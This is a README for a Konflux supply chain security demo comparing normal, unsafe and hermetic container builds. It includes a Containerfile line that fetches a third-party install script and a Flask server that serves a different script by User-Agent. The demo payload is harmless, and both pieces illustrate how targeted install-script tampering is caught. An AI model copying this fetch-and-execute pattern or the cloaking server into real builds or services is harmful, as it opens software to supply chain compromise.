# Konflux Example for OSS NA 2025 🚀 https://github.com/ralphbean/example

In these examples, we'll show a few different ways that a component can be onboarded to [konflux-ci](https://konflux-ci.dev) to demonstrate different degrees of supply chain security *that influence vulnerability management capabilities*. 🔒

[component-01](component-01/) is a basic build.

* It installs some **python wheels** 🐍 and does so directly from https://pypi.org, with network access during build.
* _We cannot be as certain about the supply chain properties of this component as we can be of others._ ⚠️

[component-02](component-02/) is similar to component-01,

* except that it **curls an installer script** from some third party site and executes it.
* _What can a platform do here?_ 🤔

[component-03](component-03/) is a hermetic build.

* It installs **python dependencies** 🐍 and that installer script, but here we have **enabled konflux [hermetic builds](https://konflux-ci.dev/docs/building/hermetic-builds/)** 🛡️
* This requires konflux to [prefetch the python content](https://konflux-ci.dev/docs/building/prefetching-dependencies/#pip) and rebuild those wheels from source.
* _This gives us a strong evidence trail for the build, clear provenance, and a clear SBOM to drive vulnerability management._ 📜

---

### How to use this repo - https://github.com/ralphbean/example

Set up konflux locally in [kind](https://kind.sigs.k8s.io/) by following the instructions in [konflux-ci/konflux-ci](https://github.com/konflux-ci/konflux-ci)

Fork this repo and clone your fork locally. Then, replace all ralphbean references with references to your work with:

```bash
find * -type f -exec sed -i 's/ralphbean/your-github-username-goes-here/' {} \;
```

Set up these example resources in your local konflux instance with:

```bash
for dirname in component-0*/resources/; do kubectl apply -k $dirname; done
```

Commit and push your local changes to your fork.

```bash
git add .
git commit -m 'Switch from user ralphbean to your-github-username-goes-here'
git push origin main
```

Login to your local konflux instance at https://localhost:9443/ns/your-github-username-goes-here/ to see your builds.

For me, that is https://localhost:9443/ns/ralphbean/applications/example-app/components

To retrigger builds off your `main` branch, annotate the components:

```bash
for i in $(seq 1 3); do kubectl annotate "components/component-0${i}" build.appstudio.openshift.io/request=trigger-pac-build; done
```

---

## component-01

This demonstrates a basic build. Let's use it to look at Konflux's basic capabilities.

Borrowing from the [Secure Supply Chain Consumption Framework (s2c2f) framework](https://github.com/ossf/s2c2f/blob/main/specification/framework.md):

| **Practice** | **Requirement** | **Maturity Level** | **Requirement Title** | **Benefit** | **Konflux 🌊** |
| --- | --- | --- | --- | --- | --- |
| *Scan*     | SCA-1 | L1 | Scan OSS for known vulnerabilities (i.e. CVEs, GitHub Advisories, etc.) | Able to update OSS to reduce risks | Run clair to find vulnerabilities |
|  |  |  |  |  |  |
| *Update*   | UPD-3 | L2 | Display OSS vulnerabilities in developer contribution flow (i.e. Pull Requests). | PR reviewer doesn't want to approve knowing that there are unaddressed vulnerabilities. | Surface CVEs in build UI and policy gate |
|  |  |  |  |  |  |
| *Update*   | UPD-2 | L2 | Enable automated OSS updates | Improve MTTR to patch faster than adversaries can operate | Konflux instance of [renovatebot](https://github.com/renovatebot/renovate) updates deps |

In the Konflux UI, show how CVEs identified by [clair](https://clairproject.org/) are exposed and other checks.

Discuss how [renovatebot](https://github.com/renovatebot/renovate) is used by Konflux to maintain references.

---

## component-02

This demonstrates a build where something bad has happened. We weren't following best practices and were the target of an attack.

```Containerfile
RUN curl http://cdn.threebean.org/install.sh > install.sh
```

Look at the logs of the build and/or launch the image as a container and investigate the contents of `install.sh`!

Run `syft` against the image and the repo. Is there evidence of the attack?

---

## Sneaky 🕵️

That installer script is served by an instance of [ralphbean/sneaky](https://github.com/ralphbean/sneaky/blob/main/server.py). 🐍

```python
from flask import Flask, request, Response

app = Flask(__name__)

@app.route('/install.sh')
def serve_install_script():
    user_agent = request.headers.get('User-Agent', '')
    
    if 'curl/8.9.1' in user_agent:
        # Malicious version for specific curl version
        content = '#!/bin/bash\necho "hacked!"\n'
    else:
        # Normal version
        content = '#!/bin/bash\necho "hello world"\n'
    
    return Response(
        content,
        mimetype='text/plain',
        headers={'Content-Disposition': 'attachment; filename=install.sh'}
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000) 
```

---

## component-03

This is a *hermetic* build. We disable network and prefetch dependencies to be sure nothing is hidden from the SBOM, from vulnerability management.


| **Practice** | **Requirement** | **Maturity Level** | **Requirement Title** | **Benefit** | **Konflux 🌊** |
| --- | --- | --- | --- | --- | --- |
| *Ingest*   | ING-4 | L3 | Mirror a copy of all OSS source code to an internal location | Business Continuity and Disaster Recovery (BCDR) scenarios. Also enables proactive security scanning, fix it scenarios, and ability to rebuild OSS in a trusted build environment. | Source artifacts stored in OCI registry, as well as all intermediary artifacts for a strong evidence trail |
|  |  |  |  |  |  |
| *Ingest*   | ING-3 | L3 | Have a Deny List capability to block known malicious OSS from being consumed | Prevents ingestion of known malware by blocking ingestion as soon as a critically vulnerable OSS component is identified, such as [colors v 1.4.1](https://security.snyk.io/vuln/SNYK-JS-COLORS-2331906), or if an OSS component is deemed malicious | [conforma](https://conforma.dev/) policy gives control at release time |
|  |  |  |  |  |  |
| *Audit*    | AUD-2 | L2 | Audit that developers are consuming OSS through the approved ingestion method | Detect when developers consume OSS that isn&#39;t detected by your inventory or scan tools | Hermetic builds ensure that sources are exposed in the manifest for audit and control |
|  |  |  |  |  |  |
| *Enforce*  | ENF-2 | L3 | Enforce usage of a curated OSS feed that enhances the trust of your OSS | Curated OSS feeds can be systems that scan OSS for malware, validate claims-metadata about the component, or systems that enforce an allow/deny list. Developers should not be allowed to consume OSS outside of the curated OSS feed | [conforma](https://conforma.dev/) prohibits the use of unauthorized sources |

Notice how this build works. Devs are forced to declare dependencies and input expected digests.

Notice that the conforma policy rejects all use of the `generic` prefetch module by default.

Discuss what would happen if the malicious install.sh were served to the prefetch task.

Look at what a conforma policy package denylist looks like.

Use [sigstore/cosign#4205] to explore OCI artifacts associated with the build.

Explode the contents of the source container to disk for inspection.

---

To retrieve the contents of the source container.

```bash
#!/bin/bash -eu

IMAGE="${1}"
REPO="${IMAGE%%:*}"

SRC_TAG=$(oras resolve $IMAGE | sed 's/:/-/').src
echo $REPO:$SRC_TAG
for DIGEST in $(oras manifest fetch $REPO:$SRC_TAG | jq -r '.layers[].digest'); do
	FILENAME=$(echo $DIGEST | sed 's/:/-/').tar.gz
	oras blob fetch $REPO@$DIGEST -o - > $FILENAME
	tar -xzf $FILENAME
	rm $FILENAME
done

for fname in $(ls extra_src_dir); do
	tar xf extra_src_dir/$fname
done
```

---
